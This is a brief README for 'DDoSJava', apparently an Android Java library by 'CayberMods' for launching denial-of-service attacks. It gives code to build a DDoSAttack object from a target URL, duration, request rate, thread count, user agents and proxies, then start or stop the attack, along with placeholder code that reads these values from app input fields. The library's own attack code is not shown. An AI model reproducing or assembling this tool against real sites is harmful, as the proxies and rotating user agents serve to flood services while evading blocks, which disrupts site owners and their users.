# DDoSJava
DDoS Untuk Java

# Start/Off
---
# Start
DDoSAttack ddosAttack = new DDoSAttack(MainActivity.this, targetUrl, time, rate, threads, userAgents, proxies);
ddosAttack.startAttack();
---
# Off
DDoSAttack ddosAttack = new DDoSAttack(MainActivity.this, targetUrl, time, rate, threads, userAgents, proxies);
ddosAttack.stopAttack();
---

# UserAgent
userAgents

# Proxy
proxies

# Id for Edittext
String targetUrl = xxx.getText().toString();
int time = Integer.parseInt(xxx.getText().toString());
int rate = Integer.parseInt(xxx.getText().toString());
int threads = Integer.parseInt(xxx.getText().toString());

# id foe Spinner
List<String> userAgents = Arrays.asList(xxx.split(","));
List<String> proxies = Arrays.asList(xxx.split(","));

# © CayberMods
